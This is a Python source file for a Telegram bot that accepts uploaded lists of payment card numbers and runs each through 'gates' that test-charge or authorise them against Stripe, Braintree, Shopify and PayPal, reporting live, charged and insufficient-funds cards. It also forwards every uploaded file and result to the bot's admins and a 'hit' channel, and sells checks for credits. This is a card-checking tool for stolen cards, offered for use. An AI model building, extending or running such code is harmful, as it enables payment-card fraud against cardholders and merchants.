import threading
import time
import io
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from telebot import types
from utils.admin_guard import is_admin
from storage.repositories.vip import is_vip_active
from storage.repositories.bans import is_banned
from security.channel_guard import is_channel_subscribed, send_channel_prompt
from storage.repositories.credits import ensure_row, get_credits, deduct_one_atomic
from storage.repositories.gates import is_gate_enabled, get_limit, get_cost
from storage.db import get_next_hit_number
from datetime import datetime
from config.settings import ADMINS, HIT_CHAT
from utils.messages import (
    approved_message,
    charged_message,
    insufficient_funds_message,
    dato, hit_detected_message
)
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from collections import defaultdict

# ================= Import Gates ==================
from gates.stripe_auth import check as stripe_auth_check
from gates.braintree_auth import check as braintree_auth_check
from gates.shopify_charge import check as shopify_charge_check
from gates.stripe_charge import check as stripe_charge_check
from gates.paypal_donation import check as paypal_donation_check

# ==================== Global ====================



cpu_count = multiprocessing.cpu_count()
MAX_THREADS = 15
max_threads = min(MAX_THREADS, max(1, cpu_count - 1))
executor = ThreadPoolExecutor(max_workers=max_threads)
print(f"Using {max_threads} threads based on CPU cores.")
user_locks = defaultdict(Lock)
state_lock = Lock()
sessions = {}
from threading import Lock
send_lock = Lock()

def safe_send(chat_id, text):
    with send_lock:
        try:
            bot.send_message(chat_id, text)
        except Exception as e:
            print(f"Failed to send: {e}")


class ComboSession:
    def __init__(self, cards):
        self.cards = cards
        self.stop = False
        self.checking = False

        self.approved = 0
        self.charged = 0
        self.funds = 0
        self.declined = 0
        self.checked = 0

        self.approved_cards = []
        self.charged_cards = []
        self.funds_cards = []
        self.declined_cards = []

        self.lock = Lock()


GATES = {
    "stripe_auth": ("Stripe_Auth", stripe_auth_check, "AUTH"),
    "braintree_auth": ("Braintree_Auth", braintree_auth_check, "AUTH"),
    "shopify_charge": ("Shopify_Charge", shopify_charge_check, "CHARGE"),
    "stripe_charge": ("Stripe Charge", stripe_charge_check, "CHARGE"),
    "paypal_donation": ("Paypal_Donation", paypal_donation_check, "CHARGE"),
}

MAX_RETRY = 3


def build_progress(percent: int, size: int = 10):
    filled = int((percent / 100) * size)
    return f"{'▰' * filled}{'▱' * (size - filled)} {percent}%"

def register_combo(bot):
    # ================= RECEIVE COMBO =================
    @bot.message_handler(content_types=["document"])
    def receive_combo(message):
        uid = message.from_user.id
        user = message.from_user
        now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

        caption = f"""
📥 <b>NEW FILE RECEIVED</b>

👤 Name : {user.first_name}
🔗 Username : @{user.username if user.username else 'None'}
🆔 ID : {user.id}
⏰ Time : {now}
📄 File : {message.document.file_name}
        """

        for admin_id in ADMINS:
            try:
                bot.get_chat(admin_id)  # تحقق من وصول البوت
                bot.send_document(admin_id, message.document.file_id, caption=caption, parse_mode="HTML")
            except Exception as e:
                print(f"⚠️ Could not send to admin {admin_id}: {e}")

        file_name = message.document.file_name.lower()
        if not file_name.endswith(".txt"):
            bot.send_message(
                message.chat.id,
                "<b>❌ ONLY .TXT FILES ARE ALLOWED</b>",
                parse_mode="HTML"
            )
            return

        if is_banned(uid):
            bot.send_message(
                message.chat.id,
                "<b>🚫 YOU ARE BANNED FROM USING THIS BOT</b>",
                parse_mode="HTML"
            )
            return

        # 🔔 Channel subscription
        if not is_channel_subscribed(bot, user_id):
            send_channel_prompt(bot, message.chat.id, name)
            return

        if uid in sessions and sessions[uid].checking:
            bot.send_message(
                message.chat.id,
                "<b>❌ A CHECK IS ALREADY RUNNING</b>",
                parse_mode="HTML"
            )

            return
        



        wait = bot.send_message(
            message.chat.id,
            "<b>⏳ PROCESSING YOUR COMBO FILE...</b>",
            parse_mode="HTML"
        )

        file_info = bot.get_file(message.document.file_id)
        raw = bot.download_file(file_info.file_path)
        cards = [c.strip() for c in raw.decode(errors="ignore").splitlines() if c.strip()]
        sessions[uid] = ComboSession(cards)

        if not cards:
            bot.edit_message_text(
                "<b>❌ EMPTY FILE</b>",
                message.chat.id,
                wait.message_id,
                parse_mode="HTML"
            )
            return

        ensure_row(uid)

        session = sessions[uid]

        kb = types.InlineKeyboardMarkup(row_width=1)
        for key, (name, _, _) in GATES.items():
            if is_gate_enabled(key):
                kb.add(types.InlineKeyboardButton(name, callback_data=f"combo:gate:{key}"))

        bot.edit_message_text(
            "<b>ϟ CHOOSE THE GATEWAY ϟ</b>",
            message.chat.id,
            wait.message_id,
            reply_markup=kb,
            parse_mode="HTML"
        )

    # ================= STOP =================
    @bot.callback_query_handler(func=lambda c: c.data == "combo:stop")
    def stop_combo(c):
        uid = c.from_user.id
        if uid in sessions:
            sessions[uid].stop = True
            bot.answer_callback_query(c.id, "⛔ Stop requested")

# ================= START CHECK =================
    @bot.callback_query_handler(func=lambda c: c.data.startswith("combo:gate:"))
    def start_check(c):
        uid = c.from_user.id
        gate_key = c.data.split(":")[-1]

        session = sessions.get(uid)
        if not session or session.checking:
            return

        gate_name, gate_func, gate_type = GATES[gate_key]
        cards = session.cards
        total = len(cards) if is_admin(uid) else min(len(cards), get_limit(gate_key))
        cost = get_cost(gate_key)

        with user_locks[uid]:
            if not is_admin(uid) and get_credits(uid) < cost:
                bot.send_message(
                    c.message.chat.id,
                    "<b>⛔ CHECK DENIED – NO CREDITS</b>\n\n<b>Use /buy to recharge</b>",
                    parse_mode="HTML"
                )
                return

        session.checking = True
        session.stop = False

        chat_id = c.message.chat.id
        message_id = c.message.message_id

        def send_file(name, data):
                if not data:
                        return

                content = "\n".join(data)
                bio = io.BytesIO(content.encode())
                bio.name = f"{name}.txt"

                user = bot.get_chat(uid)
                now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

                caption = f"""
📊 <b>{name} RESULT</b>

👤 Name : {user.first_name}
🔗 Username : @{user.username if user.username else 'None'}
🆔 ID : {user.id}
🌐 Gate : {gate_name}
⏰ Time : {now}
"""


                bot.send_document(chat_id, bio)



                
                for admin_id in ADMINS:
                    bio_admin = io.BytesIO(content.encode()) 
                    bio_admin.name = f"{name}_{user.id}.txt"
                    try:
                        bot.send_document(admin_id, bio_admin, caption=caption, parse_mode="HTML")
                    except Exception as e:
                        print(f"⚠️ Could not send to admin {admin_id}: {e}")


        # ===== INITIAL UI =====
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("━ 𝗖𝗖 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
            types.InlineKeyboardButton("━ 𝗦𝗧𝗔𝗧𝗨𝗦 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
            types.InlineKeyboardButton(
                "━ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ • 0" if gate_type == "AUTH"
                else "━ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡ • 0",
                callback_data="x"
            ),
            types.InlineKeyboardButton(
                "━ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • 0" if gate_type == "AUTH"
                else "━ 𝗙𝗨𝗡𝗗𝗦 💸 • 0",
                callback_data="x"
            ),
            types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • 0 / {total}", callback_data="x"),
            types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
        )

        bot.edit_message_text(
            f"""<b>
PLEASE WAIT CHECKING YOUR CARDS 💫
GATE ➜ {gate_name}

━━━━━━━━━━━━━━━━━━━━━━━
{build_progress(0)}
━━━━━━━━━━━━━━━━━━━━━━━
</b>""",
            chat_id,
            message_id,
            reply_markup=kb,
            parse_mode="HTML"
        )



# ================= RUN THREAD =================
        def run():
            last_update = time.time()

            try:
                for card in cards[:total]:


                    if session.stop:
                        break

                    credits = get_credits(uid)
                    if not is_admin(uid) and not is_vip_active(uid) and credits != -1 and credits < cost:
                        break

                    start = time.time()
                    result = "error"

                    for retry in range(MAX_RETRY):
                        try:
                            result = gate_func(card)
                            if result and "error" not in result.lower():
                                break
                        except Exception:
                            result = "error"

                        if "error" in result.lower() and retry < MAX_RETRY - 1:
                            time.sleep(0.5)

                    exec_time = round(time.time() - start, 2)
                    r = result.lower()

                    # ===== RESULT =====
                    if "charged" in r:
                        with session.lock:
                            session.charged += 1
                            session.charged_cards.append(card)
                            hit_no = get_next_hit_number()
                    
                  
                        bot.send_message(
                            chat_id,
                            charged_message(card, result, gate_name, exec_time, dato),
                            parse_mode="HTML"
                        )
                    
                  
                        bot.send_message(
                            HIT_CHAT,
                            hit_detected_message(
                                hit_no,
                                card,
                                "charged",
                                exec_time,
                                gate_name
                            ),
                            parse_mode="HTML"
                        )
                    
                    elif "approved" in r:
                        with session.lock:
                            session.approved += 1
                            session.approved_cards.append(card)
                            hit_no = get_next_hit_number() 
                            
                            
                        bot.send_message(
                            chat_id,
                            approved_message(card, result, gate_name, exec_time, dato),
                            parse_mode="HTML"
                        )
                                        
                       
                        bot.send_message(
                            HIT_CHAT,
                            hit_detected_message(
                                hit_no,
                                card,
                                "approved",
                                exec_time,
                                gate_name
                            ),
                            parse_mode="HTML"
                        )
                    
                    elif "fund" in r:
                        with session.lock:
                            session.funds += 1
                            session.funds_cards.append(card)
                            hit_no = get_next_hit_number() 
                    
                      
                        bot.send_message(
                            chat_id,
                            insufficient_funds_message(card, result, gate_name, exec_time, dato),
                            parse_mode="HTML"
                        )
                    
                     
                        bot.send_message(
                            HIT_CHAT,
                            hit_detected_message(
                                hit_no,
                                card,
                                "funds",
                                exec_time,
                                gate_name
                            ),
                            parse_mode="HTML"
                        )
                    
                    else:  
                        with session.lock:
                            session.declined += 1
                            



                    if credits != -1 and not is_admin(uid) and not is_vip_active(uid) and "error" not in r:
                        with user_locks[uid]:
                            deduct_one_atomic(uid)

                    with session.lock:
                        session.checked += 1
                        checked = session.checked
                        percent = int((checked / total) * 100)                        
                        
                    if time.time() - last_update >= 1:
                        last_update = time.time()


                        kb = types.InlineKeyboardMarkup(row_width=1)
                        kb.add(
                            types.InlineKeyboardButton(f"━ CC • {card}", callback_data="x"),
                            types.InlineKeyboardButton(f"━ STATUS • {result}", callback_data="x"),
                            types.InlineKeyboardButton(
                                f"━ TOTAL ⚡ • {checked} / {total}", callback_data="x"
                            ),
                            types.InlineKeyboardButton("⛔ STOP CHECK", callback_data="combo:stop"),
                        )


                        
                    try:
                        bot.edit_message_text(
                            f"""<b>
PLEASE WAIT CHECKING YOUR CARDS 💫
GATE ➜ {gate_name}

━━━━━━━━━━━━━━━━━━━━━━━
{build_progress(percent)}
━━━━━━━━━━━━━━━━━━━━━━━
</b>""",
                            chat_id,
                            message_id,
                            reply_markup=kb,
                            parse_mode="HTML"
                        )
                    except Exception:
                        pass

            finally:
                with state_lock:
                    session.checking = False
                    sessions.pop(uid, None)

                summary_text = f"""<b>✨ CHECK SUMMARY ✨</b>
━━━━━━━━━━━━━━━━━━
Approved  ✅ : {session.approved}
Charged   ⚡ : {session.charged}
Funds     💸 : {session.funds}
Declined  ❌ : {session.declined}
━━━━━━━━━━━━━━━━━━
Processed : {session.checked} / {total}
━━━━━━━━━━━━━━━━━━
"""
                bot.send_message(chat_id, summary_text, parse_mode="HTML")

                send_file("[@chk_error_bot] approved", session.approved_cards)
                send_file("[@chk_error_bot] charged", session.charged_cards)
                send_file("[@chk_error_bot] funds", session.funds_cards)



        executor.submit(run) 